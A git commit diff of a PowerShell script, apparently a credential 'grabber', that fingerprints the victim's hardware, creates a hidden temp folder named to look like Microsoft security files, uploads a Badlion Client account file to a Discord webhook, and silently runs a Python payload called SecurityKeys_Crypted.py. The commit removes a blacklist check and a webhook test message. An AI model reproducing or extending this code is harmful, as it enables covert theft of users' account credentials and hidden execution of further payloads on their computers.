e02190d7ed2b11dd4c2c980fdb2b0291844b9bfd
Appolon <93398824+Appolon24800@users.noreply.github.com>
2023-02-20 18:05:45 +0100

    Update gr.ps1

--- gr.ps1
+++ gr.ps1
@@ -12,33 +12,12 @@ $gpu = (Get-WmiObject win32_VideoController).Name
 $cpu = (Get-WmiObject Win32_Processor).Name
 $hwid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
 $ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb
-$BL = "C:\Users\env:username\AppData\Local\Packages\PSgrab.BlackList\BL-Psgrab.dat.bl.prouf"
+rm C:\windows\temp\Win.microsoft.Security.temp
 md C:\windows\temp\Win.microsoft.Security.temp
 cls
 mkdir C:\Windows\Temp\Win.microsoft.Security.temp
 attrib +h "C:\windows\temp\Win.microsoft.Security.temp"
 cls
-#####################################################################
-
-#####################################################################
-
-if (Test-Path $BL) {
-    exit
-}
-else {
-
-#####################################################################
-
-#####################################################################
-
-$webhookUri = '$webHookUrl'
-
-$Body = @{
-  'username' = 'The dev of this grabber'
-  'content' = 'If you don t see this message (lol) or you don t have any message after this the grabber don t work'
-}
-Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
-
 #####################################################################
 
 #####################################################################
@@ -187,6 +166,6 @@ Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\Badlion Client\acco
 Start-Process -FilePath "C:\Users\$env:username\AppData\Local\Programs\Python\Python311\pythonw.exe" -ArgumentList "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py"
 #Pythonw.exe is like python.exe but with no windows (like silent start)
 ######################################################################
-}
+
 
 
